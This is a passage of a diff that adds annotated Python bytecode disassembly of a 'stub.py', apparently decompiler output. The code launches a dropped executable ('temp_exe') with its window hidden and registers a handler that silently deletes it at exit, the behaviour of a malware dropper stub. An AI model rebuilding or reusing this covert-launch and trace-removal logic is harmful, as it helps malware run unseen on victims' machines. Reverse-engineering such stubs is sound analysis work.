+             310 CALL_METHOD          (1 positional argument) ; TOS = atexit.register(delete_payload)
+             312 POP_TOP
+
+ 86:         314 LOAD_GLOBAL          (subprocess) ; TOS = subprocess
+             316 LOAD_METHOD          (STARTUPINFO) ; TOS = subprocess.STARTUPINFO
+             318 CALL_METHOD          (0 positional arguments) ; TOS = subprocess.STARTUPINFO()
+             320 STORE_FAST           (startupinfo) ; startupinfo = subprocess.STARTUPINFO()
+
+ 87:         322 LOAD_FAST            (startupinfo) ; TOS = startupinfo
+             324 DUP_TOP              push(startupinfo)
+             326 LOAD_ATTR            (dwFlags) ; TOS = startupinfo.dwFlags
+             328 LOAD_GLOBAL          (subprocess) ; TOS = subprocess
+             330 LOAD_ATTR            (STARTF_USESHOWWINDOW) ; TOS = subprocess.STARTF_USESHOWWINDOW
+             332 INPLACE_OR           TOS = startupinfo.dwFlags |= (subprocess.STARTF_USESHOWWINDOW)
+             334 ROT_TWO              TOS, TOS1 = TOS1, TOS
+             336 STORE_ATTR           (dwFlags)
+
+ 88:         338 LOAD_GLOBAL          (subprocess) ; TOS = subprocess
+             340 LOAD_ATTR            (Popen) ; TOS = subprocess.Popen
+
+ 89:         342 LOAD_DEREF           (temp_exe) ; TOS = temp_exe
+             344 BUILD_LIST           1 ; TOS = [temp_exe]
+
+ 90:         346 LOAD_FAST            (startupinfo) ; TOS = startupinfo
+
+ 91:         348 LOAD_GLOBAL          (subprocess) ; TOS = subprocess
+             350 LOAD_ATTR            (CREATE_NO_WINDOW) ; TOS = subprocess.CREATE_NO_WINDOW
+
+ 92:         352 LOAD_CONST           (False) ; TOS = False
+
+ 88:         354 LOAD_CONST           (('startupinfo', 'creationflags', 'shell')) ; TOS = ('startupinfo', 'creationflags', 'shell')
+             356 CALL_FUNCTION_KW     (4 total positional and keyword args)
+             358 POP_TOP
+             360 LOAD_CONST           (None) ; TOS = None
+             362 RETURN_VALUE         return None
+
+
+# Method Name:       delete_payload
+# Filename:          stub.py
+# Argument count:    0
+# Position-only argument count: 0
+# Keyword-only arguments: 0
+# Number of locals:  0
+# Stack size:        6
+# Flags:             0x00000013 (NESTED | NEWLOCALS | OPTIMIZED)
+# First Line:        79
+# Constants:
+#    0: None
+# Names:
+#    0: os
+#    1: remove
+# Free variables:
+#    0: temp_exe
+ 80:           0 SETUP_FINALLY        (to 18) ; To line 82
+
+ 81:           2 LOAD_GLOBAL          (os) ; TOS = os
+               4 LOAD_METHOD          (remove) ; TOS = os.remove
+               6 LOAD_DEREF           (temp_exe) ; TOS = temp_exe
+               8 CALL_METHOD          (1 positional argument) ; TOS = os.remove(temp_exe)
+              10 POP_TOP
+              12 POP_BLOCK
+              14 LOAD_CONST           (None) ; TOS = None
+              16 RETURN_VALUE         return None
+
+ 82:     >>   18 POP_TOP
+              20 POP_TOP
+              22 POP_TOP
+
+ 83:          24 POP_EXCEPT
+              26 LOAD_CONST           (None) ; TOS = None
+              28 RETURN_VALUE         return None
+
